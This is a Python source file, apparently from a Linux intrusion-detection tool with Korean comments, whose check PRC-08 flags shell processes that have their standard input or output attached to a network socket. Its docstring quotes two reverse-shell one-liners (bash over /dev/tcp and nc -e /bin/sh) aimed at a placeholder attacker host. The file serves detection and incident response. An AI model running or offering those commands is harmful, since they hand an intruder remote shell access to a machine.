"""PRC-08 셸 입출력이 네트워크 소켓 (리버스 셸).

'bash -i >& /dev/tcp/공격자/4444 0>&1', 'nc -e /bin/sh 공격자 4444' 같은 리버스 셸은 셸의 표준 입력·출력을
공격자에게 이어진 TCP 소켓으로 바꾼다. 정상 셸의 입출력은 터미널(pty)이다.

판정 (심각): 셸·인터프리터의 0·1·2 중 하나가 TCP·UDP 소켓
(systemd 서비스는 표준 출력을 journald의 unix 소켓으로 보내므로 unix 소켓은 보지 않는다 — 두 VM에서 다수 확인)
"""
from ..collectors.processes import describe, processes
from ..collectors.sockets import sockets
from .base import Check, Context, Evidence
from .prc_03 import interpreter_name

STDIO = {"0": "표준 입력", "1": "표준 출력", "2": "표준 오류"}


class Prc08(Check):
    id = "PRC-08"
    title = "셸 입출력이 네트워크 소켓 (리버스 셸)"
    severity = "critical"
    attack = "T1059.004"

    def run(self, ctx: Context):
        table = processes(ctx)
        table.require_access()
        st = sockets(ctx)
        hits = {}
        for p, fd, target in table.open_files(ctx):
            if fd not in STDIO or not target.startswith("socket:[") or not interpreter_name(p):
                continue
            s = st.by_inode.get(target[8:-1])
            if s is None or not s.proto.startswith(("tcp", "udp")):
                continue
            hits.setdefault(p.pid, (p, []))[1].append((fd, s))
        findings = []
        for pid in sorted(hits, key=int):
            p, items = hits[pid]
            remote = sorted({"{}:{}".format(*s.remote) for _, s in items if s.remote and s.remote[1]})
            findings.append(self.finding(
                reason="PID {} '{}'의 {}가 네트워크 소켓이다{} — 리버스 셸".format(
                    p.pid, p.name, "·".join(STDIO[fd] for fd, _ in items),
                    " (상대 {})".format(", ".join(remote)) if remote else ""),
                next_steps="연결을 끊기 전에 상대 주소와 이 셸의 자식 프로세스·명령 기록을 기록하고 실행 파일을 보존한다(--out). "
                           "이 셸을 띄운 부모(웹 서버 프로세스면 웹쉘 — FS-06)를 따라간다.",
                evidence=[Evidence("/proc/{}".format(p.pid), describe(p, ctx.now))] +
                         [Evidence("/proc/{}/fd/{}".format(p.pid, fd), s.describe()) for fd, s in items],
            ))
        self.scope = table.scope(ctx)
        return findings
